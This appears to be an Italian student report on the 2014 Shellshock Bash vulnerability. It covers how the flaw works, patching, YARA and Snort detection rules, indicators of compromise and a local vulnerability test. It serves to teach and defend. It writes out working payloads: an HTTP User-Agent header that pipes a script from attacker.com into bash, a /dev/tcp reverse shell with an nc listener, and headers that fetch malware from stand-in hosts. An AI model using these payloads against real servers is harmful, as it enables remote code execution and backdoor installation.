# **Tesina – Shellshock (CVE-2014-6271)**

---

## 1. Introduzione all’attacco/vulnerabilità

**Shellshock** è una vulnerabilità scoperta nel **settembre 2014** nella shell **Bash** (Bourne Again Shell), utilizzata nella maggior parte dei sistemi Unix/Linux.
Permetteva a un attaccante di eseguire **comandi arbitrari da remoto**, sfruttando il modo in cui Bash gestiva alcune **variabili d’ambiente**.

Questa vulnerabilità era particolarmente pericolosa nei contesti dove Bash veniva avviata automaticamente da altri servizi, ad esempio:

* Web server che usano **CGI scripts**
* Servizi **SSH** che accettano chiavi con comandi preimpostati
* **Client DHCP**
* **Cron jobs**

---

## 2. Descrizione e periodo di riferimento

* **Data di scoperta pubblica:** 24 settembre 2014
* **CVE principale:** CVE-2014-6271
* **Altri bug collegati:** CVE-2014-7169, CVE-2014-7186, CVE-2014-7187, ecc.
* **Gravità (CVSS):** 10.0 / 10
* **Sistemi colpiti:** Tutti i sistemi Unix/Linux che usano Bash in versioni vulnerabili

Shellshock ha avuto **impatto immediato e globale**, poiché la maggior parte dei server e dispositivi connessi a Internet usavano una versione di Bash affetta.
Essendo facilissima da sfruttare, è stata immediatamente integrata in tool automatici di scansione e botnet.

---

## 3. Analisi tecnica dello svolgimento dell’attacco

La vulnerabilità si basa sul comportamento di Bash quando interpreta **funzioni definite tramite variabili d’ambiente**.
Esempio:

```bash
env x='() { :; }; comando_malevolo' bash -c "echo test"
```

Bash dovrebbe definire una funzione `x`, ma in realtà esegue anche **il comando malevolo** dopo `};`, a causa di un errore nel parser.

---

### Esempio concreto: attacco via HTTP

Se un web server usa script CGI scritti in Bash, l’attaccante può inviare una richiesta come questa:

```http
GET /cgi-bin/test.sh HTTP/1.1  
Host: victim.com  
User-Agent: () { :; }; /bin/bash -c "curl http://attacker.com/backdoor.sh | bash"
```

**Risultato:** Il server scarica ed esegue un malware o una reverse shell.
Questo succede perché i web server CGI passano l’**User-Agent** come variabile d’ambiente allo script, che lo esegue con Bash.

---

## 4. Contromisure e detection

### Contromisure tecniche:

* 🔧 **Aggiornare Bash** alla versione corretta (patch disponibile dal 2014)
* 🔒 Disabilitare l'uso di **script CGI** scritti in Bash
* 🧱 Usare un **WAF** o firewall che blocchi richieste sospette con pattern noti

### Regole di detection (esempi):

* **YARA**:

```yara
rule Shellshock {
  strings:
    $a = "() { :; };"
  condition:
    $a
}
```

* **Snort (IDS)**:

```snort
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"Shellshock exploit attempt";
  content:"() { :; };";
  http_header;
  sid:1000012;
)
```

* **Analisi dei log Apache**:
  Cerca nei log stringhe come: `() { :; };` in header HTTP sospetti

---

## 5. Indicatori di Compromissione (IOC)

### Payload utilizzati:

```bash
() { :; }; /bin/bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```
```bash
nc -lnvp 4444
```

### Header HTTP sospetti:

* `User-Agent: () { :; }; curl http://evil.com/malware.sh`
* `Referer: () { :; }; wget http://malicious.site/backdoor.sh`

### Domini noti usati negli attacchi:

* `http://malware.shellshock.org`
* `http://botnet.pwned.biz/cgi-bin/exploit.sh`

---

## 6. Fonti tecniche

* Red Hat CVE Advisory:
  [https://access.redhat.com/security/cve/cve-2014-6271](https://access.redhat.com/security/cve/cve-2014-6271)

* National Vulnerability Database (NVD):
  [https://nvd.nist.gov/vuln/detail/CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

* CISA (ex US-CERT):
  [https://www.cisa.gov/news-events/alerts/2014/09/24/bash-command-injection-vulnerability](https://www.cisa.gov/news-events/alerts/2014/09/24/bash-command-injection-vulnerability)

* Troy Hunt – Analisi tecnica Shellshock:
  [https://www.troyhunt.com/everything-you-need-to-know-about-shellshock/](https://www.troyhunt.com/everything-you-need-to-know-about-shellshock/)

---

## 7. Extra – Test locale della vulnerabilità

Per verificare se un sistema era vulnerabile:

```bash
env x='() { :; }; echo VULNERABILE' bash -c "echo Test"
```
<img width="822" height="87" alt="image" src="https://github.com/user-attachments/assets/ffdbfdc0-8f3c-49bd-bc04-3629d0c8a235" />



Se l’output fosse stato:

```
VULNERABILE
Test
```

Il sistema è vulnerabile.
